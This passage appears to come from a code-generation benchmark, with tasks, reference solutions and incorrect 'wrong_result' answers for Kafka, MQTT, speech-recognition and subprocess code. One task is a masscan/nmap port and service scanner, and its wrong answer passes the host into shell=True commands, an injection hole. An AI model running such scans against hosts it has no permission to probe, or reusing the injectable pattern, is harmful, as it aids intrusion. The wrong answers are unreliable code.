or value'\n        key_bytes = value_bytes = None\n        try:\n            self._wait_on_metadata(topic, self.config['max_block_ms'] / 1000.0)\n\n            key_bytes = self._serialize(\n                self.config['key_serializer'],\n                topic, key)\n            value_bytes = self._serialize(\n                self.config['value_serializer'],\n                topic, value)\n            assert type(key_bytes) in (bytes, bytearray, memoryview, type(None))\n            assert type(value_bytes) in (bytes, bytearray, memoryview, type(None))\n\n            partition = self._partition(topic, partition, key, value,\n                                      key_bytes, value_bytes)\n\n            if headers is None:\n                headers = []\n            assert type(headers) == list\n            assert all(type(item) == tuple and len(item) == 2 and type(item[0]) == str and type(item[1]) == bytes for item in headers)\n\n            message_size = self._estimate_size_in_bytes(key_bytes, value_bytes, headers)\n            self._ensure_valid_record_size(message_size)\n\n            tp = TopicPartition(topic, partition)\n            result = self._accumulator.append(tp, timestamp_ms,\n                                             key_bytes, value_bytes, headers,\n                                             self.config['max_block_ms'],\n                                             estimated_size=message_size)\n            future, batch_is_full, new_batch_created = result\n            if batch_is_full or new_batch_created:\n                self._sender.wakeup()\n\n            return future\n        except Errors.BrokerResponseError as e:\n            return FutureRecordMetadata(\n                FutureProduceResult(TopicPartition(topic, partition)),\n                -1, None, None,\n                len(key_bytes) if key_bytes is not None else -1,\n                len(value_bytes) if value_bytes is not None else -1,\n                sum(len(h_key.encode(\"utf-8\")) + len(h_value) for h_key, h_value in headers) if headers else -1,\n            ).failure(e)\n\n    def flush(self, timeout=None):\n        self._accumulator.begin_flush()\n        self._sender.wakeup()\n        self._accumulator.await_flush_completion(timeout=timeout)\n\n    def close(self, timeout=None):\n        self._unregister_cleanup()\n\n        if not hasattr(self, '_closed') or self._closed:\n            return\n\n        invoked_from_callback = bool(threading.current_thread() is self._sender)\n        if timeout > 0:\n            if invoked_from_callback:\n                pass\n            else:\n                if self._sender is not None:\n                    self._sender.initiate_close()\n                    self._sender.join(timeout)\n\n        if self._sender is not None and self._sender.is_alive():\n            self._sender.force_close()\n\n        self._metrics.close()\n        try:\n            self.config['key_serializer'].close()\n        except AttributeError:\n            pass\n        try:\n            self.config['value_serializer'].close()\n        except AttributeError:\n            pass\n        self._closed = True\n\n    def _cleanup_factory(self):\n        _self = weakref.proxy(self)\n        def wrapper():\n            try:\n                _self.close(timeout=0)\n            except (ReferenceError, AttributeError):\n                pass\n        return wrapper\n\n    def _unregister_cleanup(self):\n        if getattr(self, '_cleanup', None):\n            if hasattr(atexit, 'unregister'):\n                atexit.unregister(self._cleanup)\n            else:\n                try:\n                    atexit._exithandlers.remove((self._cleanup, (), {}))\n                except ValueError:\n                    pass\n        self._cleanup = None\n\n    def _max_usable_produce_magic(self):\n        if self.config['api_version'] >= (0, 11):\n            return 2\n        elif self.config['api_version'] >= (0, 10):\n            return 1\n        else:\n            return 0\n\n    def _estimate_size_in_bytes(self, key, value, headers=[]):\n        magic = self._max_usable_produce_magic()\n        if magic == 2:\n            return DefaultRecordBatchBuilder.estimate_size_in_bytes(key, value, headers)\n        else:\n            return LegacyRecordBatchBuilder.estimate_size_in_bytes(magic, self.config['compression_type'], key, value)\n\n    def _ensure_valid_record_size(self, size):\n        if size > self.config['max_request_size']:\n            raise Errors.MessageSizeTooLargeError(\n                \"The message is %d bytes when serialized which is larger than\"\n                \" the maximum request size you have configured with the\"\n                \" max_request_size configuration\" % (size,))\n        if size > self.config['buffer_memory']:\n            raise Errors.MessageSizeTooLargeError(\n                \"The message is %d bytes when serialized which is larger than\"\n                \" the total memory buffer you have configured with the\"\n                \" buffer_memory configuration.\" % (size,))\n\n    def _wait_on_metadata(self, topic, max_wait):\n        self._sender.add_topic(topic)\n        begin = time.time()\n        elapsed = 0.0\n        metadata_event = None\n        while True:\n            partitions = self._metadata.partitions_for_topic(topic)\n            if partitions is not None:\n                return partitions\n\n            if not metadata_event:\n                metadata_event = threading.Event()\n\n            metadata_event.clear()\n            future = self._metadata.request_update()\n            future.add_both(lambda e, *args: e.set(), metadata_event)\n            self._sender.wakeup()\n            metadata_event.wait(max_wait - elapsed)\n            elapsed = time.time() - begin\n            if not metadata_event.is_set():\n                raise Errors.KafkaTimeoutError(\n                    \"Failed to update metadata after %.1f secs.\" % (max_wait,))\n            elif topic in self._metadata.unauthorized_topics:\n                raise Errors.TopicAuthorizationFailedError(topic)\n\n    def _serialize(self, f, topic, data):\n        if not f:\n            return data\n        if isinstance(f, Serializer):\n            return f.serialize(topic, data)\n        return f(data)\n\n    def _partition(self, topic, partition, key, value, serialized_key, serialized_value):\n        if partition is not None:\n            assert partition >= 0\n            assert partition in self._metadata.partitions_for_topic(topic), 'Unrecognized partition'\n            return partition\n\n        all_partitions = sorted(self._metadata.partitions_for_topic(topic))\n        available = list(self._metadata.available_partitions_for_topic(topic))\n        return self.config['partitioner'](serialized_key, all_partitions, available)",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nimport atexit\nfrom concurrent.futures import Future\nfrom kafka.metrics import Metrics\nfrom kafka.record.accumulator import RecordAccumulator\nfrom kafka.metadata.cluster import ClusterMetadata\nfrom kafka.sender import Sender\nfrom kafka.common import KafkaException\n\nclass KafkaProducer:\n    def __init__(self, **configs):\n        self.config = configs\n        self._metrics = Metrics()\n        self._accumulator = RecordAccumulator(configs)\n        self._metadata = ClusterMetadata(configs)\n        self._sender = Sender(self._accumulator, self._metadata, configs)\n        self._closed = False\n        self._cleanup = self._cleanup_factory()\n        atexit.register(self._cleanup)\n\n    def send(self, topic, value=None, key=None, headers=None, partition=None, timestamp_ms=None):\n        if self._closed:\n            raise KafkaException(\"Producer is closed\")\n        record = {\n            'topic': topic,\n            'value': value,\n            'key': key,\n            'headers': headers,\n            'partition': partition,\n            'timestamp_ms': timestamp_ms\n        }\n        future = Future()\n        self._accumulator.append(record, future)\n        return future\n\n    def flush(self, timeout=None):\n        if self._closed:\n            raise KafkaException(\"Producer is closed\")\n        self._accumulator.flush(timeout)\n\n    def close(self, timeout=None):\n        if not self._closed:\n            self._closed = True\n            self._unregister_cleanup()\n            self._sender.close(timeout)\n\n    def _cleanup_factory(self):\n        def cleanup():\n            if not self._closed:\n                self.close()\n        return cleanup\n\n    def _unregister_cleanup(self):\n        atexit.unregister(self._cleanup)\n\n    def _max_usable_produce_magic(self):\n        # Implementation depends on Kafka client library version\n        pass\n\n    def _estimate_size_in_bytes(self, key, value, headers=[]):\n        # Estimate size based on serializers and data\n        pass\n\n    def _ensure_valid_record_size(self, size):\n        # Check against configured max message size\n        pass\n\n    def _wait_on_metadata(self, topic, max_wait):\n        # Wait for metadata update\n        pass\n\n    def _serialize(self, f, topic, data):\n        # Serialize data using configured serializer\n        pass\n\n    def _partition(self, topic, partition, key, value, serialized_key, serialized_value):\n        # Determine partition using configured partitioner\n        pass\n```"
  },
  {
    "Task_id": 269,
    "Instruction": "Task Description: Implement an MQTT subscriber function in Python that connects to a broker, subscribes to a topic, and processes incoming messages using the Paho MQTT client library.\n\nFunction Description: The function `mqtt_subscriber` establishes a connection to an MQTT broker over WebSockets, subscribes to a specified topic, and continuously listens for incoming messages. It utilizes callback functions to handle connection events, incoming messages, and subscription acknowledgments.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity.)\n\nOutput: None (The function prints connection status, subscription acknowledgments, and received messages to the console.)\n\n---\n\nTask Description: Implement an MQTT subscriber class in Python that encapsulates the functionality of connecting to a broker, subscribing to topics, and processing incoming messages using the Paho MQTT client library.\n\nClass Description: The `MQTTSubscriber` class provides a reusable and configurable way to subscribe to MQTT topics. It initializes with broker details and topic configurations, and it uses callback methods to handle MQTT events such as connection, message reception, and subscription.\n\nAttributes:\n\n- `client`: [mqtt.Client] - The Paho MQTT client instance used for communication.\n- `broker_address`: [str] - The address of the MQTT broker.\n- `broker_port`: [int] - The port number of the MQTT broker.\n- `topic`: [str] - The MQTT topic to subscribe to.\n- `qos`: [int] - The Quality of Service level for the subscription.\n\nMethods:\n\n- `__init__(broker_address: str, broker_port: int, topic: str, qos: int = 0) -> None` - Initializes the MQTT subscriber with broker details and topic configuration.\n- `on_connect(client: mqtt.Client, obj: Any, flags: dict, reason_code: int, properties: Any) -> None` - Callback for when the client connects to the broker.\n- `on_message(client: mqtt.Client, obj: Any, msg: mqtt.MQTTMessage) -> None` - Callback for when a message is received on the subscribed topic.\n- `on_subscribe(client: mqtt.Client, obj: Any, mid: int, reason_code_list: list, properties: Any) -> None` - Callback for when the client subscribes to a topic.\n- `start() -> None` - Connects to the broker, subscribes to the topic, and starts the MQTT loop to process messages.\n- `stop() -> None` - Stops the MQTT loop and disconnects from the broker.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \"+str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic+\" \"+str(msg.qos)+\" \"+str(msg.payload))\n\ndef on_subscribe(mqttc, obj, mid, reason_code_list, properties):\n    print(\"Subscribed: \"+str(mid)+\" \"+str(reason_code_list))\n\ndef on_log(mqttc, obj, level, string):\n    print(string)\n\ndef mqtt_subscriber():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, transport=\"websockets\")\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_subscribe = on_subscribe\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 80, 60)\n    mqttc.subscribe(\"$SYS/broker/version\", 0)\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "wrong_result": "```python\nimport paho.mqtt.client as mqtt\n\nclass MQTTSubscriber:\n    def __init__(self, broker_address: str, broker_port: int, topic: str, qos: int = 0) -> None:\n        self.client = mqtt.Client()\n        self.broker_address = broker_address\n        self.broker_port = broker_port\n        self.topic = topic\n        self.qos = qos\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n    def on_connect(self, client: mqtt.Client, obj: any, flags: dict, reason_code: int, properties: any) -> None:\n        print(\"Connected to broker\")\n        client.subscribe(self.topic, qos=self.qos)\n\n    def on_message(self, client: mqtt.Client, obj: any, msg: mqtt.MQTTMessage) -> None:\n        print(f\"Received message '{msg.payload.decode()}' on topic '{msg.topic}'\")\n\n    def on_subscribe(self, client: mqtt.Client, obj: any, mid: int, reason_code_list: list, properties: any) -> None:\n        print(f\"Subscribed to topic '{self.topic}' with QoS {self.qos}\")\n\n    def start(self) -> None:\n        self.client.connect(self.broker_address, self.broker_port, 60)\n        self.client.loop_start()\n\n    def stop(self) -> None:\n        self.client.loop_stop()\n        self.client.disconnect()\n\n# Example usage:\n# subscriber = MQTTSubscriber(\"mqtt.eclipse.org\", 80, \"test/topic\")\n# subscriber.start()\n# # To stop the subscriber after some time or when done\n# # subscriber.stop()\n```"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a Python function that establishes an MQTT client connection, subscribes to specified topics, and continuously processes incoming messages using callback functions.\n\nFunction Description: The function `wait_for_messages` initializes an MQTT client, sets up a message callback handler, subscribes to predefined topics, and enters an infinite loop to process incoming MQTT messages. It handles different message types through topic-specific callback functions.\n\nInput: None (The function uses predefined configuration and topics internally)\n\nOutput: None (The function runs indefinitely, processing messages through callbacks)\n\n---\n\nTask Description: Create a helper function to initialize and configure an MQTT client with WebSocket transport.\n\nFunction Description: The function `get_client` creates and configures an MQTT client instance with WebSocket transport, sets authentication credentials, and establishes an asynchronous connection to the broker.\n\nInput: None (Uses hardcoded connection parameters)\n\nOutput: paho.mqtt.client.Client - Returns a configured MQTT client instance\n\n---\n\nTask Description: Create a callback function to handle incoming MQTT messages and route them to appropriate handlers based on topic.\n\nFunction Description: The function `on_message_callback` processes incoming MQTT messages, logs receipt, and routes them to specific handler functions based on topic patterns. It includes error handling for message processing.\n\nInput:\n- client: paho.mqtt.client.Client - The MQTT client instance\n- userdata: Any - User-defined data passed to the callback\n- message: paho.mqtt.client.MQTTMessage - The received message object\n\nOutput: None (Messages are processed through side effects in handler functions)",
    "Canonical_solution": "import json\nimport logging\nimport paho.mqtt.client as paho\n\ndef get_client():\n    mqtt_client = paho.Client(transport=\"websockets\", client_id=\"listener\")\n    mqtt_client.enable_logger()\n    mqtt_client.username_pw_set(username=\"tavern\", password=\"tavern\")\n    mqtt_client.connect_async(host=\"broker\", port=9001)\n    return mqtt_client\n\ndef on_message_callback(client, userdata, message):\n    try:\n        logging.info(\"Received message on %s\", message.topic)\n\n        if \"devices/status\" in message.topic:\n            handle_full_status_topic(client, message)\n        elif \"lights\" in message.topic:\n            handle_lights_topic(message)\n        elif \"echo\" in message.topic:\n            handle_echo_topic(client, message)\n        elif \"ping\" in message.topic:\n            handle_ping_topic(client, message)\n        elif \"status\" in message.topic:\n            handle_status_topic(client, message)\n        else:\n            logging.warning(\"Got unexpected MQTT topic '%s'\", message.topic)\n    except Exception as e:\n        logging.exception(\"error handling message: {}\".format(e))\n\ndef wait_for_messages():\n    mqtt_client = get_client()\n    mqtt_client.on_message = on_message_callback\n    mqtt_client.reconnect()\n\n    topics = [\"lights\", \"ping\", \"echo\", \"status\"]\n\n    for t in topics:\n        device_topic = \"/device/+/{}\".format(t)\n        logging.debug(\"Subscribing to '%s'\", device_topic)\n        mqtt_client.subscribe(device_topic)\n\n    mqtt_client.subscribe(\"/devices/status\")\n\n    mqtt_client.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "wrong_result": "```python\nimport paho.mqtt.client as mqtt\nimport asyncio\n\n# Predefined topics and handlers\nTOPICS = {\n    \"sensor/temperature\": \"handle_temperature\",\n    \"sensor/humidity\": \"handle_humidity\",\n    # Add more topics and handlers as needed\n}\n\n# Predefined configuration\nMQTT_BROKER = \"broker.hivemq.com\"\nMQTT_PORT = 8080\nMQTT_USERNAME = \"username\"\nMQTT_PASSWORD = \"password\"\n\ndef get_client():\n    client = mqtt.Client(transport=\"websockets\")\n    client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)\n    client.connect_async(MQTT_BROKER, MQTT_PORT)\n    return client\n\nasync def wait_for_messages():\n    client = get_client()\n    client.on_connect = lambda c, u, f, rc: c.subscribe([(topic, 0) for topic in TOPICS.keys()])\n    client.on_message = on_message_callback\n    await client.loop_start()\n    while True:\n        await asyncio.sleep(1)\n\ndef on_message_callback(client, userdata, message):\n    print(f\"Received message '{message.payload.decode()}' on topic '{message.topic}'\")\n    try:\n        handler_name = TOPICS.get(message.topic)\n        if handler_name:\n            handler = globals().get(handler_name)\n            if handler:\n                handler(message.payload.decode())\n            else:\n                print(f\"No handler found for topic: {message.topic}\")\n        else:\n            print(f\"Unhandled topic: {message.topic}\")\n    except Exception as e:\n        print(f\"Error processing message: {e}\")\n\ndef handle_temperature(payload):\n    print(f\"Processing temperature: {payload}\")\n\ndef handle_humidity(payload):\n    print(f\"Processing humidity: {payload}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    asyncio.run(wait_for_messages())\n```"
  },
  {
    "Task_id": 279,
    "Instruction": "Task Description: Create a Python class that utilizes subprocess communication to perform network scanning operations using masscan and nmap tools for both TCP and UDP ports.\n\nClass Description: The SubprocessScanner class provides functionality to scan a target host for open TCP/UDP ports using masscan and then perform service detection on those ports using nmap. It handles subprocess communication and output parsing.\n\nAttributes:\nhost: str - The target host IP address or hostname to be scanned\n\nMethods:\nuseMasscanTCP() -> list - Scans the host for open TCP ports using masscan and returns a list of open port numbers\nuseMasscanUDP() -> list - Scans the host for open UDP ports using masscan and returns a list of open port numbers\nuseNmapServTCP(port: str) -> str - Performs service detection on the specified TCP port using nmap and returns the service information\nuseNmapServUDP(port: str) -> str - Performs service detection on the specified UDP port using nmap and returns the service information",
    "Canonical_solution": "import subprocess\nimport re\n\nclass SubprocessScanner:\n    def __init__(self, host):\n        self.host = host\n\n    def useMasscanTCP(self):\n        try:\n            ports = list()\n            cmd = ['masscan', '-sS', '-Pn', '-p21-25,53,80-90,99,110,113,119,121-123,137-139,\\\n                    170,443-445,456,554,513-514,559,873,888,1080-1099,1200-1212,1234,1243-1255,\\\n                    1433-1434,1521,2000,2049,2181,2200-2300,2375,2535,3127-3128,3300-3310,3389,\\\n                    4443-4444,5000-5001,5432,5900-5901,5432,5984,6000,6370-6380,6984,7000-7010,\\\n                    8000-8200,8443-8449,8880-8900,9000-9001,9043,9080-9100,9200-9210,9300,9668,\\\n                    9876,9990-10000,10080,11211,12345,16379,18080,20000-20010,22220-23000,26379,\\\n                    27010-27020,33060,50070', self.host]\n            out1, err1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            out2, err2 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            pattern = re.compile('[0-9]+/tcp')\n            list1 = re.findall(pattern, bytes.decode(out1))\n            list2 = re.findall(pattern, bytes.decode(out2))\n            listres = list(set(list1).union(set(list2)))\n            for item in listres:\n                ports.append(item.replace('/tcp', ''))\n            return ports\n        except Exception as e:\n            return {}\n\n    def useMasscanUDP(self):\n        try:\n            ports = list()\n            cmd = ['masscan', '-sS', '-Pn', '-pU:20-25,79,110,123,137-139,161,180,513-514,559,666,999,\\\n                    1011-1032,1042-1054,1200-1201,1342-1349,2000-2002,3333,6666,26274,26374,26444,26573,\\\n                    27184,27444,29589,29891,30103,31320-31340,34555,35555', self.host]\n            out1, err1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            out2, err2 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            pattern = re.compile('[0-9]+/udp')\n            list1 = re.findall(pattern, bytes.decode(out1))\n            list2 = re.findall(pattern, bytes.decode(out2))\n            listres = list(set(list1).union(set(list2)))\n            for item in listres:\n                ports.append(item.replace('/udp', ''))\n            return ports\n        except Exception as e:\n            return {}\n\n    def useNmapServTCP(self, port):\n        try:\n            cmd = ['nmap', '-sV', '-Pn', '--scan-delay', '2',\n                   '--host-timeout', '2m', '--version-intensity', '6', self.host, '-p', port]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n        except Exception as e:\n            cmd = ['nmap', '--host-timeout', '1m', self.host, '-p', port]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n\n    def useNmapServUDP(self, port):\n        try:\n            cmd = ['nmap', '-sV', '-Pn', '--scan-delay', '2',\n                   '--host-timeout', '2m', '--version-intensity', '6', '-sU', '-pU:{}'.format(port), self.host]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n        except Exception as e:\n            cmd = ['nmap', '--host-timeout', '1m', '-sU', '-pU:{}'.format(port), self.host]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\nclass SubprocessScanner:\n    def __init__(self, host):\n        self.host = host\n\n    def useMasscanTCP(self) -> list:\n        command = f\"masscan {self.host} -p0-65535 --rate=1000\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        open_ports = []\n        if result.returncode == 0:\n            for line in result.stdout.splitlines():\n                if \"open\" in line:\n                    port = line.split()[3].split('/')[0]\n                    open_ports.append(int(port))\n        return open_ports\n\n    def useMasscanUDP(self) -> list:\n        command = f\"masscan {self.host} -pU:0-65535 --rate=1000\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        open_ports = []\n        if result.returncode == 0:\n            for line in result.stdout.splitlines():\n                if \"open\" in line:\n                    port = line.split()[3].split('/')[0]\n                    open_ports.append(int(port))\n        return open_ports\n\n    def useNmapServTCP(self, port: str) -> str:\n        command = f\"nmap -sV {self.host} -p {port}\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        if result.returncode == 0:\n            for line in result.stdout.splitlines():\n                if f\"{port}/tcp\" in line:\n                    service_info = line.split(maxsplit=2)[-1]\n                    return service_info\n        return \"Service not found\"\n\n    def useNmapServUDP(self, port: str) -> str:\n        command = f\"nmap -sU -sV {self.host} -p {port}\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        if result.returncode == 0:\n            for line in result.stdout.splitlines():\n                if f\"{port}/udp\" in line:\n                    service_info = line.split(maxsplit=2)[-1]\n                    return service_info\n        return \"Service not found\"\n```"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Implement a class that interacts with Alibaba Cloud's Flash Recognizer service to convert audio files into text with timing information using HTTP client functionality.\n\nClass Description: AliRecognitionService is a client for Alibaba Cloud's speech recognition API that processes audio files and returns recognition results with timestamps.\n\nAttributes:\nALI_ACCESS_AKID: str - Alibaba Cloud access key ID for authentication\nALI_ACCESS_AKKEY: str - Alibaba Cloud access key secret for authentication\nALI_APP_KEY: str - Application key for the recognition service\ntoken: str - Authentication token obtained using access credentials\nformat: str - Audio file format (default: \"wav\")\nsampleRate: int - Audio sample rate in Hz (default: 16000)\nurl: str - API endpoint URL for the recognition service\n\nMethods:\n__init__(access_key_id: str, access_key_secret: str, app_key: str) -> None - Initializes the recognition service with authentication credentials and application key\nprocess(audioFile: str) -> List[AliRecognitionResult] - Processes an audio file and returns a list of recognition results containing text with begin/end timestamps\n\nHelper Class:\nAliRecognitionResult: A data class to store recognition results with text and timing information\n__init__(text: str, begin_time: int, end_time: int) -> None - Initializes a recognition result with text and its timing information",
    "Canonical_solution": "import http.client\nimport json\nfrom typing import List\n\nclass AliRecognitionResult:\n    def __init__(self, text, begin_time, end_time):\n        self.text = text\n        self.begin_time = begin_time\n        self.end_time = end_time\n\nclass AliRecognitionService:\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str):\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = getToken(self.ALI_ACCESS_AKID, self.ALI_ACCESS_AKKEY)\n        self.format = \"wav\"\n        self.sampleRate = 16000\n        self.url = 'https://nls-gateway-cn-shanghai.aliyuncs.com/stream/v1/FlashRecognizer'\n\n    def process(self, audioFile: str) -> List[AliRecognitionResult]:\n        result_list = []\n        request = self.url + '?appkey=' + self.ALI_APP_KEY\n        request = request + '&token=' + self.token\n        request = request + '&format=' + self.format\n        request = request + '&sample_rate=' + str(self.sampleRate)\n\n        with open(audioFile, mode='rb') as f:\n            audioContent = f.read()\n        \n        host = 'nls-gateway-cn-shanghai.aliyuncs.com'\n        httpHeaders = {'Content-Length': len(audioContent)}\n        \n        conn = http.client.HTTPSConnection(host)\n        conn.request(method='POST', url=request, body=audioContent, headers=httpHeaders)\n        response = conn.getresponse()\n        \n        body = response.read()\n        try:\n            body = json.loads(body)\n            status = body['status']\n            if status == 20000000:\n                result = body['flash_result']\n                if 'sentences' in result:\n                    for sentence in result['sentences']:\n                        result_list.append(\n                            AliRecognitionResult(sentence['text'], sentence['begin_time'], sentence['end_time']))\n        except ValueError:\n            print('The response is not json format string')\n        finally:\n            conn.close()\n        return result_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nfrom dataclasses import dataclass\nfrom typing import List\n\n@dataclass\nclass AliRecognitionResult:\n    text: str\n    begin_time: int\n    end_time: int\n\nclass AliRecognitionService:\n    ALI_ACCESS_AKID = \"your_access_key_id\"\n    ALI_ACCESS_AKKEY = \"your_access_key_secret\"\n    ALI_APP_KEY = \"your_app_key\"\n    token = \"\"\n    format = \"wav\"\n    sampleRate = 16000\n    url = \"https://nls-gateway.cn-shanghai.aliyuncs.com/stream/v1/recognize\"\n\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str) -> None:\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = self.get_token()\n\n    def get_token(self) -> str:\n        # Placeholder for token retrieval logic\n        return \"your_token_here\"\n\n    def process(self, audioFile: str) -> List[AliRecognitionResult]:\n        headers = {\n            \"Authorization\": f\"Bearer {self.token}\",\n            \"Content-Type\": \"application/octet-stream\",\n            \"Accept\": \"application/json\"\n        }\n        params = {\n            \"appkey\": self.ALI_APP_KEY,\n            \"format\": self.format,\n            \"sample_rate\": self.sampleRate\n        }\n        with open(audioFile, 'rb') as f:\n            response = requests.post(self.url, headers=headers, params=params, data=f.read())\n        results = []\n        if response.status_code == 200:\n            data = response.json()\n            for item in data['result']['ws']:\n                text = item['cw'][0]['w']\n                begin_time = item['cw'][0].get('b', 0)\n                end_time = item['cw'][0].get('e', 0)\n                results.append(AliRecognitionResult(text, begin_time, end_time))\n        return results\n```"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that runs a Python subprocess with pipe communication, compares the output with expected results from a JSON file, and asserts their equality.\n\nFunction Description: The function `run_subprocess_with_pipe` executes a Python subprocess with given arguments, captures its output through a pipe, and compares this output with expected results loaded from a JSON file. The comparison includes checking the length of the results and verifying that all elements match between the expected and actual outputs.\n\nInput:\n- `expected_file`: [str] - Path to the JSON file containing the expected output data.\n- `*args`: [variable arguments] - Additional command-line arguments to pass to the subprocess.\n\nOutput: None (The function performs assertions to validate the output against the expected results. If assertions fail, an AssertionError is raised.)",
    "Canonical_solution": "import sys\nimport subprocess\nimport json\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    dg = subprocess.Popen([sys.executable] + list(args), stdout=subprocess.PIPE)\n    stdout, _ = dg.communicate()\n    expected = json.load(open(expected_file))\n    result = json.loads(stdout.decode())\n    \n    assert len(expected) == len(result)\n    assert all(r in result for r in expected)\n    assert all(r in expected for r in result)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport json\nimport subprocess\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    # Execute the subprocess with piped output\n    result = subprocess.run(['python'] + list(args), capture_output=True, text=True)\n    \n    # Load expected results from the JSON file\n    with open(expected_file, 'r') as f:\n        expected_results = json.load(f)\n    \n    # Convert subprocess output to list of lines\n    actual_results = result.stdout.strip().split('\\n')\n    \n    # Assert that the lengths of the results match\n    assert len(actual_results) == len(expected_results), \"The number of results does not match the expected number.\"\n    \n    # Assert that each element in the results matches\n    for actual, expected in zip(actual_results, expected_results):\n        assert actual == expected, f\"Result mismatch: expected '{expected}', got '{actual}'\"\n```"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words into their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model. The class should handle both single words and lists of words, and provide options for retrieving multiple pronunciation candidates.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words to their phonetic pronunciations using a specified FST model. It supports both single-word and batch processing, with optional n-best results.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for G2P conversion.\n- nbest: [int/None] - The number of best pronunciation candidates to return for each word (optional).\n- _logger: [logging.Logger] - Logger instance for debugging and error reporting.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> None - Initializes the G2P converter with the path to the FST model and optional n-best setting.\n- execute(fst_model, input, is_file=False, nbest=None) -> dict - Executes the phonetisaurus-g2p command with the given input and returns the pronunciation results as a dictionary.\n- _translate_word(word) -> dict - Internal method to translate a single word to phonemes.\n- _translate_words(words) -> dict - Internal method to translate a list of words to phonemes using a temporary file.\n- translate(words) -> dict - Main interface method that translates either a single word or a list of words to their phonetic pronunciations.",
    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport tempfile\nimport logging\nimport yaml\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self._logger.debug(\"Using FST model: '%s'\", self.fst_model)\n        self.nbest = nbest\n        if self.nbest is not None:\n            self._logger.debug(\"Will use the %d best results.\", self.nbest)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if nbest is not None:\n            cmd.extend(['--nbest=%d' % nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(suffix='.g2p', delete=False) as f:\n            for word in words:\n                f.write(\"%s\\n\" % word)\n            tmp_fname = f.name\n        output = 